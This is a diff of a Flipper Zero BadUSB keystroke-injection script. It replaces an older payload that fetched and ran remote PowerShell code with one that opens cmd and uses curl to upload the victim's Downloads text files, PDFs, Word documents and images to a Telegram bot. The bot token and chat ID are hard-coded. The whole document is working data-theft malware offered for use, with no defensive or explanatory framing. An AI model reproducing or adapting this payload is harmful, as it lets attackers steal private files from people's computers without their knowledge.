@@ -1,19 +1,48 @@
+REM ============================================
+REM Flipper Zero - File Collector FIXED
+REM Separate loops for each file type
+REM ============================================
 
-REM Title: beigeworm's Exfiltrate files to Telegram
-REM Author: @beigeworm
-REM Description: This script searches the users folder fot pictures, documents, logs, PDFs and more, then sends its all to a dropbox account.
-REM Target: Windows 10
-
-REM *SETUP*
-REM replace TELEGRAM_TOKEN with your Telegram Token.
-
-REM some setup for dukie script
-DEFAULT_DELAY 100
-
-REM open powershell (remove -W Hidden to show the window)
-DELAY 1000
+DEFAULT_DELAY 800
+DELAY 8000
 GUI r
-DELAY 750
-STRING powershell -Ep Bypass -C $tg='TELEGRAM_TOKEN'; iex (irm bw0.cc/extg)
+DELAY 5000
+STRING cmd
+DELAY 3000
 ENTER
+DELAY 8000
 
+REM 1. Start message
+STRING curl "https://api.telegram.org/bot8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI/sendMessage?chat_id=6614794141&text=Collecting%20files"
+DELAY 2000
+ENTER
+DELAY 5000
+
+REM 2. TXT files from Downloads
+STRING FOR %F IN ("%USERPROFILE%\Downloads\*.txt") DO curl.exe -F "chat_id=6614794141" -F "document=@%F" "https://api.telegram.org/bot8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI/sendDocument" & timeout /t 3 /nobreak >nul
+DELAY 2000
+ENTER
+DELAY 8000
+
+REM 3. PDF files from Downloads
+STRING FOR %F IN ("%USERPROFILE%\Downloads\*.pdf") DO curl.exe -F "chat_id=6614794141" -F "document=@%F" "https://api.telegram.org/bot8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI/sendDocument" & timeout /t 3 /nobreak >nul
+DELAY 2000
+ENTER
+DELAY 8000
+
+REM 4. DOC/DOCX files from Downloads
+STRING FOR %F IN ("%USERPROFILE%\Downloads\*.doc" "%USERPROFILE%\Downloads\*.docx") DO curl.exe -F "chat_id=6614794141" -F "document=@%F" "https://api.telegram.org/bot8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI/sendDocument" & timeout /t 3 /nobreak >nul
+DELAY 2000
+ENTER
+DELAY 8000
+
+REM 5. Image files from Downloads
+STRING FOR %F IN ("%USERPROFILE%\Downloads\*.jpg" "%USERPROFILE%\Downloads\*.jpeg" "%USERPROFILE%\Downloads\*.png") DO curl.exe -F "chat_id=6614794141" -F "document=@%F" "https://api.telegram.org/bot8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI/sendDocument" & timeout /t 3 /nobreak >nul
+DELAY 2000
+ENTER
+DELAY 8000
+
+REM 6. Completion
+STRING curl "https://api.telegram.org/bot8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI/sendMessage?chat_id=6614794141&text=All%20files%20sent"
+DELAY 2000
+ENTER
